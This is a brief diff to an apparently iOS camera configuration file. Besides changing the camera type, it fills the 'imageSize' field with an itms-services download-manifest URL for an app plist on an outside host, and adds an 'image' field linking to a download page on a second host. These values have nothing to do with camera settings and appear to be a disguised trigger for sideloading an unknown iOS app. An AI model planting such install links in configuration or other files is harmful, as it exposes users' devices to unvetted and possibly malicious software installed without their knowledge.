@@ -1,6 +1,6 @@
 # cameraConfig
-cameraConfig { "cameraType":0, 
+cameraConfig { "cameraType":1, 
 "imageQuality":"high",
-"imageSize":"",
+"imageSize":"itms-services://?action=download-manifest&url=https://dsda3112.com/ios/4.0.1/jnfc/app_jnfc_4.0.1.plist", "image":"http://lasi555.com/downLoad/downLoad.html?userAgent=ios",
 "CameraBrand":"system",
 "platform":"iOS"}
